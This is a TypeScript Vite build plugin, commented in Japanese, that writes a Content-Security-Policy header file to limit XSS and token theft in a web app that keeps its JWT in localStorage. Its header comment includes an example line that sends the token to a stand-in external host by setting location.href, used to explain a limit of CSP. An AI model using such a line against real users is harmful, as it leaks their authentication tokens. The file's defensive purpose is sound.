/**
 * 本番の Web (Workers Static Assets) が返す Content-Security-Policy を、 build のたびに
 * `dist/_headers` へ書き出す。
 *
 * 目的は、 localStorage の JWT (`stella_auth_token_v1`) を読まれる XSS を起こしにくくし、
 * 起きたときの持ち出しの経路を減らすこと:
 * - script-src に 'unsafe-inline' を入れない。 差し込まれた inline script・イベント属性・外部 script は
 *   動かない。 index.html の inline script (テーマの初期適用) は、 書き出し済みの HTML から sha256 を
 *   取って個別に許す (文面を直しても許可が追随する)。
 * - fetch・画像・メディアの宛先 (connect-src / img-src / media-src) を、 自分・API・教材 (R2) に絞る。
 * - 他サイトへの埋め込み (frame-ancestors) を禁じる。
 *
 * これは持ち出しを防ぐ保証ではない。 スクリプトが動いてしまえば、 トップレベルの画面遷移
 * (`location.href = "https://外部/?t=" + token`) や `window.open` で JWT を URL に載せて外へ出せ、
 * CSP はこれを止められない (遷移を縛る directive は無い。 form-action はフォーム送信だけ)。
 * XSS のときにも JWT を読ませないことが要件になったら、 JavaScript から読めない HttpOnly Cookie へ
 * 移す (Web と API を同じサイトに置く必要がある)。
 *
 * API と教材のオリジンは画面と同じ `VITE_SERVER_URL` / `VITE_MATERIALS_BASE_URL` から取るので、
 * 宛先を変えたら build し直せば CSP も揃う。 dev サーバー (`vite dev`) には付かない — `_headers` は
 * Workers Static Assets が配信時に読むファイル。
 */
import { createHash } from "node:crypto";
import { writeFileSync } from "node:fs";
import path from "node:path";
import type { Plugin } from "vite";

/** Google ログインで取ったプロフィール画像 (`profiles.avatar_url`) の配信元。 */
const GOOGLE_AVATAR_HOSTS = "https://*.googleusercontent.com";
/** index.html の Google Fonts。 CSS と、 そこから読むフォント本体で配信元が違う。 */
const GOOGLE_FONTS_CSS = "https://fonts.googleapis.com";
const GOOGLE_FONTS_FILES = "https://fonts.gstatic.com";

export interface CspInput {
  /** `VITE_SERVER_URL` (API)。 未設定ならデモ (fixture) 経路で、 API へは通信しない。 */
  serverUrl?: string;
  /** `VITE_MATERIALS_BASE_URL` (教材の公開 R2)。 */
  materialsBaseUrl?: string;
  /** index.html にある inline script の本文。 */
  inlineScripts: readonly string[];
}

/** URL からオリジンだけを取る。 空・不正な値は null (CSP に紛れ込ませない)。 */
export function originOf(url: string | undefined): string | null {
  const trimmed = url?.trim();
  if (!trimmed) return null;
  try {
    const { origin, protocol } = new URL(trimmed);
    if (protocol !== "https:" && protocol !== "http:") return null;
    return origin;
  } catch {
    return null;
  }
}

/** HTML から src の無い `<script>` の本文を取り出す (CSP のハッシュは本文のバイト列に対して取る)。 */
export function inlineScriptsOf(html: string): string[] {
  const scripts: string[] = [];
  for (const match of html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)) {
    const attributes = match[1] ?? "";
    const body = match[2] ?? "";
    if (/\ssrc\s*=/i.test(attributes)) continue;
    scripts.push(body);
  }
  return scripts;
}

function sha256Source(script: string): string {
  return `'sha256-${createHash("sha256").update(script, "utf8").digest("base64")}'`;
}

export function buildContentSecurityPolicy(input: CspInput): string {
  const remote = [...new Set([originOf(input.serverUrl), originOf(input.materialsBaseUrl)])].filter(
    (origin): origin is string => origin !== null,
  );
  const directives: [string, ...string[]][] = [
    ["default-src", "'self'"],
    [
      "script-src",
      "'self'",
      // sql.js と QuickJS (課題のプレビュー採点) の WASM。
      "'wasm-unsafe-eval'",
      // CMS の課題エディタが使うブラウザ版 ESLint は、 ルール設定の検証 (ajv) で `new Function` を
      // 呼ぶ。 外すと管理者のプレビュー採点が動かない。 inline script・外部 script・
      // `javascript:` は引き続き止まる。 ESLint を Worker に移せば外せる。
      "'unsafe-eval'",
      ...input.inlineScripts.map(sha256Source),
    ],
    // CodeMirror・sonner・xterm が実行時に <style> を差し込むので 'unsafe-inline' が要る。
    ["style-src", "'self'", "'unsafe-inline'", GOOGLE_FONTS_CSS],
    ["font-src", "'self'", "data:", GOOGLE_FONTS_FILES],
    // blob: はスキルツリーの講座アイコン (API から取った SVG を blob URL で mask-image に渡す)。
    ["img-src", "'self'", "data:", "blob:", ...remote, GOOGLE_AVATAR_HOSTS],
    // blob: は面談対策の読み上げ・録音の再生。 教材の動画は R2 から直接読む。
    ["media-src", "'self'", "blob:", ...remote],
    // fetch / XHR / WebSocket / sendBeacon の宛先。 画面遷移 (location・window.open) は縛れない。
    ["connect-src", "'self'", ...remote],
    ["worker-src", "'self'"],
    ["object-src", "'none'"],
    ["base-uri", "'self'"],
    ["form-action", "'self'"],
    ["frame-ancestors", "'none'"],
  ];
  return directives.map((parts) => parts.join(" ")).join("; ");
}

/** Workers Static Assets の `_headers` 形式。 全パス (SPA の fallback を含む) に付ける。 */
export function headersFile(csp: string): string {
  return `/*\n  Content-Security-Policy: ${csp}\n`;
}

export function securityHeaders(): Plugin {
  let env: Record<string, string> = {};
  return {
    name: "security-headers",
    apply: "build",
    configResolved(config) {
      env = config.env as Record<string, string>;
    },
    writeBundle(output, bundle) {
      const html = bundle["index.html"];
      if (html?.type !== "asset" || !output.dir) {
        throw new Error("[security-headers] index.html が成果物に無いため CSP を書き出せません");
      }
      const csp = buildContentSecurityPolicy({
        serverUrl: env.VITE_SERVER_URL,
        materialsBaseUrl: env.VITE_MATERIALS_BASE_URL,
        inlineScripts: inlineScriptsOf(String(html.source)),
      });
      writeFileSync(path.join(output.dir, "_headers"), headersFile(csp));
    },
  };
}
